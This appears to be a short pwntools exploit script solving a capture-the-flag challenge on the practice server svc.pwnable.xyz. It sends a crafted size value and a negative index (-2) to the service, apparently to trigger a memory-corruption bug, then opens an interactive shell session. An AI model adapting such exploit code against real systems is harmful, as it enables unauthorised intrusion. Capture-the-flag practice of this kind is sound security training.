from pwn import *

r = remote('svc.pwnable.xyz', 30007)

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'ize: ', b'4196913')
r.sendlineafter(b'> ', b'-2')

r.interactive()
